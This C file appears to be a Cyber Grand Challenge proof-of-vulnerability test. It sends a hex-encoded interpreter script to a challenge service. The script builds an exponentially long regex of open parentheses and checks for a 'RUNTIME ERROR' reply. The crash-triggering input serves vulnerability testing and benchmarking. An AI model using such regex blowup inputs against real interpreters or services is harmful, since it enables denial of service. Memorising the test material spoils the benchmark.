#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x45\x4e\x44\x20\x7b\x0a\x20\x20\x20\x20\x72\x20\x3d\x20\x22\x28"
         "\x28\x28\x28\x28\x28\x28\x28\x28\x28\x28\x28\x28\x28\x28\x28\x22"
         "\x3b\x0a\x20\x20\x20\x20\x66\x6f\x72\x20\x28\x69\x20\x3d\x20\x30"
         "\x3b\x20\x69\x20\x21\x3d\x20\x31\x33\x3b\x20\x69\x2b\x2b\x29\x0a"
         "\x20\x20\x20\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72\x20"
         "\x3d\x20\x72\x20\x72\x3b\x0a\x20\x20\x20\x20\x7d\x0a\x20\x20\x20"
         "\x20\x70\x72\x69\x6e\x74\x20\x22\x61\x73\x64\x66\x22\x20\x7e\x20"
         "\x72\x3b\x0a\x7d\x72\x65\x63\x6f\x72\x64\x31\x0a";
      static unsigned int write_00000_00000_len = 124;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x52\x55\x4e\x54\x49\x4d\x45\x20\x45\x52\x52\x4f\x52\x0a";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 14);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
}
